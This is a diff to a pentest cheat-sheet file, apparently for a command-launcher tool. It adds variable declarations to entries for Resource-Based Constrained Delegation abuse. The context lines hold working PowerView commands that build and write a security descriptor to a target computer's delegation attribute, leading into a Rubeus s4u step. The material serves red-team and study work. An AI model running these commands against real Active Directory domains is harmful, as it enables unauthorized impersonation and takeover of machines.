@@ -52,6 +52,7 @@ Create a raw security descriptor that grants the controlled SID the RBCD rights.
 $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($controlled_sid))"
 ```
 <!-- cheat
+var controlled_sid := $controlled_sid
 -->
 
 ### PowerView: allocate descriptor bytes
@@ -64,6 +65,7 @@ Allocate a byte array for the serialized RBCD security descriptor.
 $sd_bytes = New-Object byte[] ($sd.BinaryLength)
 ```
 <!-- cheat
+var sd := $sd
 -->
 
 ### PowerView: serialize descriptor
@@ -76,6 +78,7 @@ Serialize the RBCD security descriptor to bytes for LDAP storage.
 $sd.GetBinaryForm($sd_bytes, 0)
 ```
 <!-- cheat
+var sd_bytes := $sd_bytes
 -->
 
 ### PowerView: write RBCD attribute
@@ -89,6 +92,7 @@ Get-DomainComputer "$target_computer" | Set-DomainObject -Set @{'msds-allowedtoa
 ```
 <!-- cheat
 var target_computer
+var sd_bytes := $sd_bytes
 -->
 
 ### Rubeus s4u
